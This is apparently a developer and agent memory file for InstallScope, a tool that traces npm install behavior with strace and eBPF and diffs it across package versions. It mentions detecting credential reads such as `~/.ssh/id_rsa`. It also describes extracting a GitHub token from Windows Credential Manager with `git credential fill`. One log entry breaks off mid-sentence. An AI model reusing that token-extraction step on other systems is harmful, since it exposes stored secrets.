# Memory.md — InstallScope dev-kit state
> Update at end of EVERY working session. Boot order in any new chat/agent: THIS file → Scope.md →
> current phase in Phases.md. Do not re-read the codebase before reading these.

## Status snapshot
- Current phase: **Phase 5 — backfill RUN AND GREEN. G3 blocked on a human decision, not on code.**
  250 recordings of 50 packages exist and verify. What the corpus does *not* yet contain is a receipt:
  see "The G3 problem" below, which is the honest read and the thing that needs a human call.
- Gates: G1 ✅ (#33297876067) · G2 ✅ (#33298010607) · G3 ⬜ — **candidates ranked, none worth
  publishing.** Not a code failure. Phases.md:41's stop rule is now live.
- Phase 1 ✅ COMPLETE (strace recorder, schema v1, 0 unwraps, clean/PARTIAL handling)
- Phase 2 ✅ COMPLETE (aya eBPF backend, 10+ tracepoints, synthetic parity OK)
- Phase 3 ✅ COMPLETE (run [#33527991116](https://github.com/mukti-sys/InstallScope/actions/runs/33527991116), commit `9e558c7`)
- Phase 4 ✅ COMPLETE — 2026-09-02, six commits `bc02bfb`…`bd5145e`. Three green runs on `bd5145e`:
  [#33595022475](https://github.com/mukti-sys/InstallScope/actions/runs/33595022475) (action E2E, 30
  steps, first try),
  [#33594659009](https://github.com/mukti-sys/InstallScope/actions/runs/33594659009) (rust, both jobs),
  [#33594658855](https://github.com/mukti-sys/InstallScope/actions/runs/33594658855) (harness tests).
  **Still unproven and unprovable without a real PR:** the artifact hand-off between `record.yml` and
  `comment.yml`, and the comment appearing.
- **Phase 5 harness ✅ COMPLETE AND PROVEN** — five commits `cebe279`…`ea1d3e2`. Two backfills:
  - [#33629671812](https://github.com/mukti-sys/InstallScope/actions/runs/33629671812) — 10 packages × 3
    versions, 30 recordings, 100% completion, 20 pairs compared, 0 blocked.
  - [#33632942704](https://github.com/mukti-sys/InstallScope/actions/runs/33632942704) — **the full run.
    23/23 jobs green.** 250 recordings of 50 packages, 250 verified / 0 failed, **200 version pairs
    compared, 0 blocked**, 100% completion, 0 PARTIAL, 0 version mismatches, 22.21 MB store.
  - **The reproducibility property held at scale.** 0 blocked comparisons across 200 pairs means
    recordings made on 20 different runners, at different times, in different directories, all reduced
    to comparable profiles. That was the single biggest Phase 5 risk and it is now settled.
  - One red run first — [#33622648886](https://github.com/mukti-sys/InstallScope/actions/runs/33622648886),
    30/30 recordings lost to a single bug — see the session log. Every downstream guard behaved
    correctly, which is why it cost one fix commit rather than a published dataset of nothing.
- Local toolchain: rustup (stable-x86_64-pc-windows-**gnu**; msvc has no linker here), `gh` 2.98.0.
  **Note on `gh`:** it reports "not logged into any GitHub hosts" — there is no `gh` config on this
  machine. It works when `GH_TOKEN` is populated from the Windows Credential Manager first
  (`git credential fill` → `password=`). `git push` needs no such help.
  mingw-w64 (WinLibs UCRT, gcc 16.1.0) installed via winget so `zstd-sys` can build on this host. Zig
  0.16 also installed while attempting to cross-compile it for Linux — that did not work (`zig cc`
  rejects the `x86_64-unknown-linux-gnu` triple cargo passes it), so cross-target linting is no longer
  possible locally. See the TESTS.md note.

## The G3 problem — read this before deciding anything about launch
**The pipeline works. The dataset is real. There is no receipt in it.**

Measured, not guessed. Of the 200 version-to-version comparisons in run #33632942704:

| Behavior class changed between versions | Diffs |
|---|---|
| network | **0** |
| credential reads | **0** |
| writes outside expected directories | **0** |
| processes | 3 |
| filesystem only | 197 |

The corpus *does* observe those classes — 1,023 network observations, 500 credential reads, 558 process
spawns across 250 recordings. But **none of them changes between versions**. Every version of every
package makes the same network calls, because those calls are npm fetching from the registry. The
credential reads are `.npmrc`. Nothing new appears.

The three process-change candidates, which the reweighted ranking correctly surfaced as the most
interesting things available:

- `bcrypt@6.0.0` vs `5.1.1` — started running `node-gyp-build`
- `protobufjs@7.6.6` vs `8.8.0` — started running `sh`
- `sqlite3@5.1.7` vs `5.1.6` — started running `prebuild-install`

All three are native-addon packages doing what native-addon packages do. A maintainer's reaction is
"yes, obviously", not "wait, what?". **A rule firing is not a receipt** — that distinction is the whole
reason `select-receipts.mjs` refuses to confirm anything, and it is now load-bearing rather than
theoretical.

Phases.md:41's stop rule is therefore live, and **this is a human decision, not a code decision.** The
harness will not get better at finding receipts by being improved; it is already surfacing the most
behaviorally interesting changes the corpus contains. Four options, with what each actually costs:

1. **Widen the corpus.** `packages.txt` has 50 entries, so `limit=200` recorded all of them. A genuine
   200-package list roughly quadruples the surface, at ~4× the runner time (the full 50-package run took
   about 25 minutes across 20 shards). Note the packages most likely to be interesting — `puppeteer`,
   `playwright`, `sharp`, `node-gyp` — are *already in the list* and recorded cleanly, so their
   version-to-version behavior may be as stable as everything else. Widening tests a hypothesis; it does
   not guarantee a receipt.
2. **More versions per package.** 5 versions covers months. A behavior introduced two years ago and still
   present shows as "unchanged" in every pair — the diff engine can only see *changes*, so a package that
   has always phoned home is invisible to it. Going to 20 versions reaches back years, at 4× the cost of
   option 1 again.
3. **Accept the finding and reposition.** "We recorded 250 installs across 50 packages and found install
   behavior is remarkably stable between versions" is a real, defensible, publishable result. It is also
   the opposite of the pitch, and Scope.md:60 pre-authorizes exactly this reduction. The dataset and the
   tooling remain genuinely useful for the *per-PR* case (Phase 4), which never depended on the corpus
   being alarming.
4. **Read further than the top 25.** 450 candidates exist; the queue shows 25. Cheap, and unlikely to
   change the picture given that 197 of 200 diffs are filesystem-only.

A fifth possibility worth naming because it is the honest one: the corpus may be measuring the wrong
thing. The diff engine finds *changes between versions*, and a malicious package is malicious from its
first published version — there is no earlier version to differ from. That makes the version-diff the
wrong instrument for catching an attack, and the right instrument for catching a *compromise of an
existing package*, which is rarer. The per-PR report (Phase 4) does not have this limitation.

**What must not happen:** widening the rules until something fires. That is manufacturing the gate's own
evidence, and Rules.md rule 7 names it as a process failure. If install behavior is boring, the honest
move is to say so.

## Locked decisions (do not re-litigate)
Evidence-not-protection framing (banned words in Rules.md §4) · audit-mode observe-only v1, strict
opt-in later · trigger = lockfile-diff ONLY · npm+pnpm only v1 · no LLM anywhere v0.x · strace ships
first, aya gated on G1 · score 0–100 + max 3 bullets · backfill = top ~200 × last ~5 versions,
clean-VM-per-package · PARTIAL badge mandatory on incomplete recordings · star gate = ≥300/30d +
≥10 org signups/60d · Scope.md = canonical boundary authority (default-OUT rule) · Author & Git
discipline: all commits/pushes under GitHub account `mukti-sys`, standard target is **1 commit pushed per day**
(squash session into one atomic commit; fix/hotfix commits explicitly allowed if a CI run or gate fails).

## Kill gate protocol
A failed gate stops everything until Memory.md records: what failed, the fallback branch taken
(aya→libbpf-rs→strace-only; G2-fail→reposition/stop per Scope.md pre-authorized reductions), and
human sign-off. Never code around a gate.

## Session log (append-only)
- 2026-08-29: Dev kit v1 written (PRD/Scope/Architecture/Rules/Phases/Design/this file). No code.
  Next human actions: run G1 (1h), run G2 harness (~2d), trademark/search check on the name
  "InstallScope" + GitHub name-collision check.
- 2026-08-29: Phase 0 gate tooling written under `harness/` + 3 workflows. Still no product code.
  - Venue change, NOT scope change: dev machine is win32 with no WSL/cargo/gh, so Phases.md:7's
    "fresh VM per package" is realized as one `ubuntu-latest` matrix job per package. Scope.md:25
    already names ubuntu-latest as in-scope; no IN/OUT entry touched, no promotion needed.
  - G2: `record-package.sh` (strace -f -ff, private HOME/cache/project), `parse-trace.mjs`
    (→ JSONL), `classify.mjs` (Architecture.md §4 severities, 40/15/5/1), `aggregate.mjs`.
    61/61 golden checks pass locally against a labeled-synthetic fixture.
  - G1: aya tracepoint hello-world (`g1-common`/`g1-ebpf`/`g1-loader`) on sys_enter_execve,
    self-triggers `/bin/true` so a pass never depends on runner idleness.
  - Workflows: `g1-aya-probe.yml`, `g2-strace-harness.yml` (both workflow_dispatch only — they run
    untrusted install scripts and need sudo), `harness-tests.yml` (golden tests + mechanical
    Rules.md §4 banned-language check, runs on every push).
  - Neither gate is decided by a script. G2 reports *candidates*; G1 prints what a pass does and
    does not prove. Human sign-off lands here.
  - Git discipline: standard target is **1 commit/day** (squashing a session into one atomic commit
    as `mukti-sys`), but fix commits are explicitly allowed on the same day if a gate or CI fails.
- 2026-08-29: Gates executed on GitHub Actions (`mukti-sys/InstallScope`):
  - **G1 PASSED** (Run #33247765244): aya eBPF tracepoint compiled, loaded under sudo, attached to
    `sys_enter_execve`, self-triggered `/bin/true`, and recorded real kernel events into `g1-probe` artifact.
  - **G2 50/50 PASSED** (Run #33247962017): all 50 packages recorded cleanly under `strace -f -ff`
    across 50 isolated matrix jobs; 51 artifacts generated (50 package receipts + aggregated `g2-summary`).
  - Fix pushed (commit `a627d5f`): used `cargo-binstall` for prebuilt `bpf-linker`.
- 2026-08-29: **Phase 1 written** — `core/` (schema v1), `recorder/` (strace backend), `cli/`
  (`installscope record` / `verify`). 65 tests pass; `cargo fmt` clean; `clippy -D warnings` clean
  against the Linux target with `--all-targets`. Not yet committed or pushed.
  - **Schema v1 resolves the three Phase 0 harness deviations**, all promoted into
    `core/src/events.rs` with the reasoning recorded in the module docs:
    1. `ts_ns` stays session-relative — epoch ns exceeds JSON's safe-integer range, so a JS reader
       would silently corrupt it. Absolute time lives once, in `session_start.wall_clock_utc`.
    2. `dns_query` promoted — strace cannot attribute a TCP connect to a hostname, so without it
       every network finding degrades to a bare IP. Architecture.md §4 already presumes such an event.
    3. `pid`/`syscall` promoted as `EventMeta` — evidence a reader cannot trace to a specific syscall
       in a specific process is an assertion, not evidence.
  - **The write-accounting gap is closed.** The harness did not trace `write()`, so byte volumes were
    impossible and Design.md:35's "wrote ~13 MB outside project dir" was unproducible. The recorder
    traces `write`/`pwrite64`/`writev`, maintains a per-pid fd table (inherited across `clone`,
    aliased through `dup*`, flushed at `close`), and aggregates per descriptor into one `fs_write`
    carrying summed bytes. Asserted by golden test and by an E2E `dd` of exactly 512 KiB.
  - **New schema field `TracedPath.origin`** (`kernel`/`absolute`/`resolved_from_dirfd`/`unresolved`).
    Not in Architecture.md; added because "write outside expected dirs" is the critical ×40 rule and
    a guessed absolute path would manufacture that finding out of a relative one. Unresolved paths
    are recorded but explicitly not placeable.
  - `NetConnect.host` exists but the strace backend always leaves it `None`: correlating a DNS answer
    to a connect requires guessing, and a hostname attached to the wrong connection is worse than no
    hostname. Phase 2's aya backend may be able to fill it honestly.
  - PARTIAL is enforced structurally: `SessionEnd::partial` cannot be constructed without a reason,
    `finish_complete`/`finish_partial` consume the writer, and `Drop` writes a PARTIAL end if a code
    path ever forgets. `summarize_stream` treats a missing `session_end` as a hard error, never as a
    clean zero-finding result.
  - `installscope verify` exists so CI can check the artifact rather than trust the recorder's exit
    code. Exit 3 = PARTIAL, distinct from 1 = failed.
  - Workflows added: `rust.yml` (fmt/clippy/test every push, plus mechanical checks that no
    `#[allow(clippy::unwrap_used)]` appears in product code and that no LLM/cloud/telemetry crate is
    in the dependency tree) and `phase1-e2e.yml` (records a real `npm install` on ubuntu-latest, runs
    the `#[ignore]`d E2E suite, verifies the artifact independently, weekly schedule).
  - `harness-tests.yml` banned-language check extended to cover `core/ recorder/ cli/`.
- 2026-08-30: **Phase 1 verified against real kernels. Three bugs found only by running it** — each
  one invisible to unit tests, and each of a kind this product exists to catch in other tools.
  - **Relative `--out` produced a silently empty recording** (found in run #33294557064). strace is
    spawned with `current_dir(cwd)` so the install runs in the project, but `-o` was relative, so
    strace resolved it against the *install's* directory, failed with "Can't fopen", and wrote no
    trace files. The recording correctly said PARTIAL but blamed the backend for our own bug — the
    worst shape of error here, since an incomplete recording looks like it might be a finding about
    the package. Fixed by canonicalizing `out_dir` once, before anything is created.
  - **strace diagnostics were counted as parse errors.** `-f` prints `strace: Process N attached` for
    every child, and every npm install spawns children, so *every real recording* would have been
    forced PARTIAL — making the badge meaningless exactly when it must be trusted. Now counted as
    `diagnostics`; only the subset reporting real data loss (detaching, OOM, write errors) forces
    PARTIAL.
  - **DNS produced zero events despite a connect to port 53** (runs #33296408610, #33297018475). Took
    two rounds because each fix targeted a syscall shape glibc does not actually use. The resolver
    connects its UDP socket, then batches the A and AAAA queries for one hostname into a single
    `sendmmsg` with NULL `msg_name` and one `iov_base` per message. Fixed by recording each socket's
    peer at `connect` (propagated through `dup*`), tracing all four send variants, and extracting
    *every* `iov_base` rather than the first — reading one would have silently halved the questions.
    Without this the whole product claim degrades: "connected to 104.16.2.34" is not evidence,
    "resolved registry.npmjs.org" is.
  - Also: the recorder's own `out_dir` is now a declared zone. The traced command's stdout/stderr are
    files inside it, so `record --out /tmp/x` against a project elsewhere would have produced a
    critical "wrote outside expected dirs" finding caused entirely by the observer. CLI zone paths are
    canonicalized for the same reason the relative `-o` failed: observed paths are always absolute.
  - CI fixes: restored `Swatinem/rust-cache` (dropped in 230d631), removed the unused strace install
    from `rust.yml`, and moved `-D warnings` off job-level `RUSTFLAGS` where it applied to dependency
    compilation and would fail the build on any upstream crate's warning.
  - **Verified green (all five workflows):** rust #33297635044 · harness-tests #33297635048 ·
    phase1-e2e #33297648728 · G1 #33297876067 (3 events, BTF present, load+attach ok) ·
    G2 #33298010607 (6 packages, 13 candidates, 0 PARTIAL).
- 2026-08-30: **Phase 2 written.** Uncommitted; review and commit deferred to 2026-08-31 by request.
  - `abi/` — new crate, the kernel/userspace ABI. `no_std`, dependency-free, flat `#[repr(C)]` records
    with explicit padding. Tests assert exact struct sizes: if the two sides disagree on layout, a path
    silently becomes garbage with no error surfacing, so the sizes are asserted rather than assumed.
  - `recorder/aya-ebpf/` — probes for openat (entry+exit), write, close, mkdirat, renameat2, connect,
    execve, plus `sched_process_fork`/`exit`.
  - `recorder/src/merge.rs` — 50 ms reorder window keyed `(ktime, sequence)`, fd table, write
    aggregation, cross-CPU ordering.
  - `recorder/src/translate.rs` — merged records → schema v1.
  - `recorder/src/parity.rs` + `installscope parity` — the Phase 2 Done condition made checkable.
  - `recorder/src/clock.rs` — RFC3339 formatting shared by both backends, extracted from `strace.rs`
    so two recordings of the same install carry identical anchors.
  - `harness/parity/parity-workload.sh` + README — the synthetic workload.
  - `.github/workflows/phase2-aya.yml` — first thing that will ever compile the probes.
  - `rust.yml` extended: lints and tests the `aya-backend` feature (otherwise a warning in `aya.rs`
    would only surface on a manual-dispatch workflow), and asserts `allow(unsafe_code)` appears in
    exactly one file.
- 2026-08-31: **Phase 2 verified and COMPLETE.** Run #33417231156 on commit `25c19e5`.
  - eBPF probes compiled on `bpfel-unknown-none` via nightly + `bpf-linker`. CLI linked with
    `aya-backend` feature. All 10+ tracepoints attached under sudo. Recording exited 0.
  - **PARITY OK: 29 shared facts, 40 differences (0 unexplained).**
  - Bugs found and fixed across ~14 iterations:
    1. **Stack overflow in probes** — `PendingOpen` on the BPF stack exceeded 512 bytes; moved to
       per-CPU array scratch space.
    2. **`sched_process_fork` offsets** — `__data_loc char[]` descriptors, not inline 16-byte buffers.
       Format file dump caught it before the first run.
    3. **Multi-core event ordering** — per-CPU perf buffers deliver events out of temporal order.
       Added `BTreeMap<(ktime, seq)>` reorder window in `merge.rs` for timestamp-ordered fd tracking.
    4. **Legacy syscall gaps** — `mkdir`, `rename`, `unlink`, `symlink`, `link`, `chmod`, `truncate`
       added alongside their `*at` variants. Legacy probes marked optional (skip without PARTIAL).
    5. **`sched_process_exit` race** — removing tgid on exit raced against kernel closing fds,
       dropping trailing writes. Removed early deletion.
    6. **Parity classifier gaps** — `/dev/null` writes (character device), `command-stderr.log`
       (inherited recorder fd), `mkdir -p` intermediates (entry-side, EEXIST filtered by strace),
       workload CWD mkdir (different dir names between backends).
  - Commits: `53fca2e` (CI logging), `1a446c0` (sched_exit fix), `b253d5a` (6/7 parity classifiers),
    `25c19e5` (final CWD mkdir classifier).

### Phase 2 design decisions worth not re-litigating
- **Parity is not equality.** The backends observe differently, so demanding identical output would
  either fail forever or get loosened until it proved nothing. Every difference is classified
  `Expected(reason)` or `Unexpected`; only the latter fails. The expected list lives in code with
  reasons attached, so widening it is a visible diff in review rather than a quiet fix for a red run.
- **The relative-path allowance is pairwise.** Judging facts in isolation let a genuinely missed write
  hide behind it — strace reports `/work/x/real.txt`, aya reports nothing, and a naive classifier waves
  the absolute path through as "probably the resolved form of something". Now the matching relative
  counterpart must actually exist, with a component-boundary check so `/work/other.txt` does not pair
  with `her.txt`. Three tests cover the trap.
- **A PARTIAL input fails parity regardless of the diff.** Two streams can agree perfectly and prove
  nothing if one stopped early.
- **In-kernel pid filtering.** eBPF probes fire for every process on the host; without `TRACKED_PIDS` a
  CI recording would also contain the runner agent and every daemon that ticked. Maintained in-kernel
  via `sched_process_fork` because a forked child can exec and write within microseconds, long before a
  userspace loop learns it exists. This is what makes the aya backend a recorder rather than a monitor.
- **`openat` is split entry/exit.** Entry knows the path, exit knows the descriptor, and the descriptor
  is what gives a later `write` a path. My first draft emitted on entry only, which would have reopened
  the Phase 0 byte-accounting gap on this backend.
- **`unsafe` is one module wide.** `recorder/src/lib.rs` moved from `forbid` to `deny(unsafe_code)` so
  `aya.rs` can opt in; reading a `#[repr(C)]` record from an untyped perf-buffer slice has no safe
  equivalent. Every cast is size-checked first, and `rust.yml` now asserts no second file opts in.
- **`aya-backend` is an off-by-default feature.** A user who wants only the strace backend should not
  carry an eBPF dependency, and the binary must build on a machine that cannot load BPF.
- **`fs_read` is a permanent strace-backend advantage** (decided 2026-08-30, human call). Phases.md:23
  scopes the aya backend to "fs write, tcp connect, proc spawn"; reads are not on that list, and adding
  them would push the probes past a Scope.md boundary. The credential-read filter stays in the strace
  parser, where a path list is editable without touching kernel code or re-verifying on a live kernel.
  - Consequence, stated rather than buried: an install reading `~/.ssh/id_rsa` yields a `high` finding
    (Architecture.md §4) under strace and **nothing** under aya. The backends are **not**
    interchangeable.
  - **Phase 3 obligation:** the report must not present an aya recording as equivalent coverage. The
    parity output keeps the asymmetry visible in per-class counts; the report needs to do the same.
  - `KIND_FS_READ` stays defined in `abi/` as reserved-not-emitted, so the loader's decode path handles
    it if a future phase promotes reads through Scope.md, rather than leaving a hole in the numbering.

## Commit ledger (one line per pushed commit — tracks daily pushes)
- 2026-08-29 — `chore: scaffold Phase 0 kill-gate harness for G1 and G2` — dev kit + harness/ + 3
  workflows. Pushed to `origin/main` (`mukti-sys/InstallScope`).
- 2026-08-29 — `fix(ci): use cargo-binstall for bpf-linker in G1 workflow` (`a627d5f`) — gate fix,
  allowed same-day per Rules.md §6.
- 2026-08-30 — `feat: implement core event model, strace recorder engine, and CLI` — `core/`, `recorder/`,
  `cli/`, `rust.yml`, `phase1-e2e.yml`. Pushed to `origin/main` (`mukti-sys/InstallScope`).
- 2026-08-30 — six `fix(ci)`/`fix` commits (`230d631`…`5efd2fd`) driving Phase 1 CI to green, plus
  `Add G2 badge to README` (`ea2bd2d`).
- 2026-08-30 — `fix: resolve output directory before spawning strace` (`5b2fa70`).
- 2026-08-30 — `fix(recorder): decode DNS sent on connected sockets` (`afa82e7`).
- 2026-08-30 — `fix(recorder): decode batched DNS queries from sendmmsg` (`d5624f8`).
- Note on the 1-commit/day rule: 2026-08-30 carries far more than one, all of them fix commits driven
  by red CI or red gates, which Rules.md §6 permits. The *feature* work was a single commit. If the
  intent is stricter than that, the rule needs rewording rather than reinterpreting.
- 2026-09-01 — `feat: behavior rules engine, YAML catalog, and report renderers` (`9e558c7`) — Phase 3.
- 2026-09-02 — **six commits, Phase 4, pushed together as one push.** A deliberate departure from the
  1-commit/day ceiling, requested by the human: the work spans six independently reviewable concerns, and
  squashing it would have produced a commit nobody could bisect or read.
  - `bc02bfb` `feat(lockfile): parse npm v1-v3 and pnpm v5-v9 lockfiles and diff dependency changes`
  - `b49e21b` `feat(registry): content-addressed zstd snapshot store and behavioral diff engine`
  - `332d04b` `feat(report): behavioral diff markdown and self-contained HTML reports`
  - `f07ccd4` `feat(cli): snapshot, diff, and lockfile-diff subcommands`
  - `6556301` `feat(action): two-workflow least-privilege GitHub Action with PR injection guards`
  - `bd5145e` `ci: update workflows, test log, and README for Phase 4`
  - The bundle order was adjusted from the one first proposed: the root `Cargo.toml` had to travel with
    the first two commits that add workspace members, `corpus/demo/diff-*.jsonl` with the report commit
    that tests against them, and the cli commit before the action commit that invokes its subcommands.
    Verified rather than asserted — six detached worktrees, full suite in each.
- 2026-09-02 — **five commits, Phase 5, same day as Phase 4.** Two are fix commits driven by red or
  useless gate output, which Rules.md §6 permits; the other three are the feature work, bundled.
  - `cebe279` `feat(registry): corpus summary, and expose diff comparisons as JSON`
  - `39d2088` `feat(corpus): version resolver, per-recording harness, sharding, and receipt queue`
  - `93e4dc1` `ci(phase5): sharded corpus backfill workflow`
  - `6653cd1` `ci: run the corpus golden tests on every push, and count them in TESTS.md`
  - `e8b89e5` `fix(corpus): resolve the recorder before env -i, and isolate the shard registry` — after
    run #33622648886 lost 30/30 recordings.
  - `ea1d3e2` `fix(corpus): rank receipt candidates by behavior class, not by count` — after run
    #33629671812 produced a working corpus and an unreadable queue.
  - Each of the first four verified to build and test independently in a detached worktree: 553 cargo
    tests at every commit, and the corpus golden suite at every commit that contains it.
  - Note on the 1-commit/day rule: 2026-09-02 carries eleven commits across two phases. The feature work
    was bundled by concern at the human's request; the rest are fixes driven by red CI or red gates. If
    the intent is stricter than that, the rule needs rewording rather than reinterpreting — the same note
    2026-08-30 already carries.

## Deliberate deviations, logged so they are not mistaken for drift
- **clap and tracing-subscriber use `default-features = false`.** clap's `color` feature pulls
  anstream → windows-sys, which cannot link on this dev machine (no MSVC linker; the gnu toolchain's
  `dlltool` also failed). Dropping ANSI styling costs nothing for a tool whose output is read by CI
  and scripts, and it shrinks the tree Rules.md §1 asks to keep small. This is the right default for
  this binary, not a workaround to revisit.
- **`zstd` is a C dependency, confined to `registry/` and asserted so in CI.** See the Phase 4 decisions
  above for why the pure-Rust alternative was rejected on evidence rather than on preference.
- **Cross-target clippy is no longer possible on this dev machine.** Before Phase 4, `clippy --target
  x86_64-unknown-linux-gnu` covered the aya backend from Windows. `zstd-sys` cannot cross-compile without
  a Linux C toolchain, and `zig cc` was tried and rejected the triple cargo passes it. `test-log.mjs` now
  reports the aya set as *skipped entirely* rather than failed — "cannot be checked here" and "checked and
  broken" are different claims, and conflating them would make TESTS.md the misleading artifact it exists
  to prevent. CI runs on Linux natively and checks both sets.
- The three harness schema deviations are now **resolved** in schema v1 (see the session log above).
  `harness/` keeps its own throwaway JS parser and is deliberately not kept in sync; the Rust
  recorder supersedes it.
- Recorder post-processes trace files after the command exits rather than tailing live. `-ff` writes
  one file per pid, and a live tail would race processes that fork and die quickly. Cost: events are
  not available until the install finishes, which no consumer needs.
- Reads are filtered to credential/env-bearing paths, in the recorder rather than the schema, so the
  list can tighten without a schema bump. Recording every read would bury the evidence.
- All aya/Cargo pins in `harness/g1` remain `TODO-verify` against the passing G1 run's `Cargo.lock`
  artifacts. Phase 2 must reconcile them before writing `recorder/aya/`.

## Open threads
- Socket's current CLI state must be re-verified before any public neighbor-table claim.
- ~~Registry v0 hosting choice (aux branch Releases vs bucket) — decide in Phase 4, not before.~~
  **RESOLVED 2026-09-01 (human call): local filesystem store only.** `installscope snapshot push` writes to
  a directory; CI uploads it as an artifact. Architecture.md:103 forbids the product having network
  authority, and a remote backend becomes an adapter over the same layout if one is ever wanted. The
  layout is the contract: `blobs/<first two hex>/<rest>` plus `index.jsonl`.
- Name search-adjacency check pending.
- **`harness/g2/packages.txt` is hand-written, NOT a verified ranking, and it is now the binding
  constraint on the corpus.** 50 entries, so `limit=200` recorded all of them and the "200 packages" in
  Phases.md:38 has never actually been attempted. Run `rank-packages.mjs` and use its "N packages with ≥X
  weekly downloads as of DATE" phrasing; never claim "the top 50" or "the top 200". A ranking claim is
  fact-checkable, and PRD.md:66 warns specifically about being fact-checked at launch.
- **The PR-comment path is unproven end to end.** `record.yml` → artifact → `comment.yml` → posted comment
  needs a real pull request; a self-contained workflow cannot demonstrate it. The commenting job's inputs
  are tested, GitHub's artifact delivery across a `workflow_run` boundary is not. Do not describe the
  comment as working until a real dependency PR has produced one.
- ~~No corpus exists.~~ **A corpus exists and verifies** (run #33632942704, 250 recordings, 22.21 MB).
  What does not exist is a confirmed receipt — see "The G3 problem" at the top. **Nothing about the corpus
  may be published as a receipt**, and the dataset numbers themselves are safe to quote in the phrasing
  `summarize-corpus.mjs` generates.
- ~~Phases.md:39's "~50k version-behaviors" is unverified.~~ **Verified and wrong by more than an order of
  magnitude**: 840,069 observations of 195,780 distinct behaviors from 50 packages. Phases.md:39 needs
  correcting, and the *distinct* count is the one to publish — 99.8% of observations are `node_modules`
  and cache writes every install performs.
- ~~`--timeout 600` in the corpus harness is a guess.~~ 900s used on the full run with nothing timing out,
  including `sqlite3`, `bcrypt`, `protobufjs`, `puppeteer` and `playwright`. Still not a measurement of the
  worst case, but no longer an untested number.
- `.gitignore` excludes the seven dev-kit docs, so a fresh clone has no design context. Phase 6 owns
  the public README (Design.md:46); the README now carries the CLI surface and crate layout, which is
  developer-facing rather than the launch version.
- **Known Phase 1 limitations, all deliberate and all Phase 2/3 concerns:**
  - `NetConnect.host` is always `None` from strace. Correlating a DNS answer to a specific connect
    requires guessing, and a hostname on the wrong connection is worse than none. The `dns_query`
    events carry the names; joining them is a rules-engine decision, not a recorder one.
  - Many `connect` events carry `port: 0` — glibc probes candidate addresses that way. Harmless, but
    the Phase 3 rules engine must not read port 0 as an unusual-port finding. (The aya translator
    already omits port 0 for this reason.)
  - `sendmmsg` batch decoding reads every `iov_base`, but strace's `-s 512` still truncates long
    payloads; a truncated question yields no event and increments `dns_undecodable` rather than
    guessing.
  - Only DNS is extracted from datagrams. Other UDP traffic is visible as a `connect` but its payload
    is not inspected.

- **Phase 2 open questions for the first real run:**
  - Tracepoint argument offsets in `recorder/aya-ebpf/` are the load-bearing assumption. `ARG0=16`
    with an 8-byte stride for `syscalls/sys_enter_*`; `parent_pid=24`/`child_pid=44` for
    `sched_process_fork`. `phase2-aya.yml` dumps every format file *before* building, so a mismatch is
    a five-minute fix rather than a guessing game.
  - **The aya backend records no `fs_read` events.** RESOLVED 2026-08-30: this is a permanent
    strace-backend advantage, not a gap. See the locked decision above. Nothing to do in Phase 2 beyond
    the documentation already in place (`parity.rs` module docs, `aya-ebpf/src/main.rs`,
    `harness/parity/README.md`, `abi/src/lib.rs`).
  - Write byte counts from aya are the *requested* count (`sys_enter` precedes the write), labelled
    `flags: "requested_count"`. strace's are actual. Parity does not compare byte values.
  - No `dns_query` from aya at all, by design. Full parity on that class is not achievable.
  - `MAX_ARGV = 20` and `ARGV_BUF_LEN = 1024` in the ABI are guesses at what a real postinstall needs.
    The first run against a real install should check how often `FLAG_ARGV_TRUNCATED` fires.
  - Scope.md:59 pre-authorizes the fallback if the probes cannot be made to work:
    aya → libbpf-rs → strace-only. Phase 1 shipping means that fallback costs a feature, not the
- 2026-09-01: **Phase 3 COMPLETE** — rules engine, YAML catalog, and reporting infrastructure:
  - Rules engine in `core/` evaluating 12 catalog predicates (`rules/catalog.yaml`) with compiled Rust logic,
    strict zone placement (`Inside`, `Outside`, `Runtime`, `Unresolvable`), deduplication, and score calculation
    (40/15/5/1 weighting capped at 100 with raw score tracked).
  - Multi-surface reporting in `installscope-report`: SARIF 2.1.0 emitter (`sarif.rs`), GitHub PR comment Markdown
    generator (`markdown.rs`), self-contained offline-safe HTML report with inline CSS and Beacon `#FF6A3D`
    theme (`html.rs`).
  - Synthetic golden demo corpus in `corpus/demo/` covering clean, high, critical, partial, and aya-clean runs,
    verified via integration tests in `core/tests/corpus.rs`.
  - CLI subcommand `installscope report` wired to evaluate event streams and emit SARIF/Markdown/HTML artifacts.
  - Workspace test suite at 320 tests, zero warnings across both standard and aya-backend configurations.
- 2026-09-01: **Phase 4 written.** Uncommitted; CI has not run. 548 tests, `fmt` + `clippy -D warnings`
  clean, every workflow YAML parses, all 50 embedded bash blocks pass `bash -n`.
  - **Phase 3 obligation discharged first.** Memory.md:194 required the report to keep the strace/aya
    asymmetry visible the way the parity harness does. `report/src/html.rs` now renders a per-class
    coverage table on *every* report, not only aya ones — a table that appears only when something is
    wrong teaches a reader to read its absence as completeness. Wording comes from
    `core::observability` rather than being re-phrased in the renderer.
  - `lockfile/` — new crate. npm `lockfileVersion` 1/2/3 and pnpm `5.4`/`'6.0'`/`'9.0'`, reduced to one
    `Package` model, plus the diff that decides whether a PR introduced code that will run.
  - `registry/` — new crate. `sha256(zstd(events))` content-addressed store, append-only `index.jsonl`,
    behavior profiles (zone-relative, so two recordings of the same install on different machines reduce
    identically), and the version-diff engine.
  - `report/src/diff.rs` — the Design.md:51 two-column diff, Markdown and self-contained HTML.
  - `cli/` — `lockfile-diff`, `snapshot push|list|verify`, `diff <pkg> <v1> <v2>`.
  - `action/record` + `action/comment` — two composite actions, deliberately split (see below).
  - `corpus/demo/diff-{before,after}.jsonl` + `report/tests/diff_corpus.rs` — the golden pair.
  - `.github/workflows/phase4-action.yml` — builds a fresh repository, simulates a dependency PR, and
    runs the whole pipeline. `rust.yml` gained the Phase 4 pipeline check, the trigger-contract check, the
    C-dependency confinement check, and Action linting.
- 2026-09-02: **Phase 4 COMPLETE and green.** Six commits `bc02bfb`…`bd5145e`; runs #33595022475 (action
  E2E), #33594659009 (rust), #33594658855 (harness tests). Details in the status snapshot.
  - **Two bugs found before pushing, by running the workflow shell rather than reading it.** All 50
    `run:` blocks were extracted from the workflow and action YAML and executed locally. Both bugs were of
    the kind that only a real run exposes, and both would have failed the first CI attempt:
    1. **`lockfile-diff` rejected its own Action's input.** `Ecosystem::from_path` matched on the exact
       filename, but a workflow obtains the base copy with
       `git show origin/main:package-lock.json > base-package-lock.json` — it *must* rename, because
       writing to the real filename would clobber the working tree's copy, the very file being compared
       against. Fixed by taking the ecosystem from the `--after` side, which is the file under its real
       name. A filename that does identify an ecosystem still wins, so a genuine mismatch stays visible.
    2. **The tamper test was not tampering.** `printf 'X' | dd of=blob bs=1 seek=5 conv=notrunc` is a
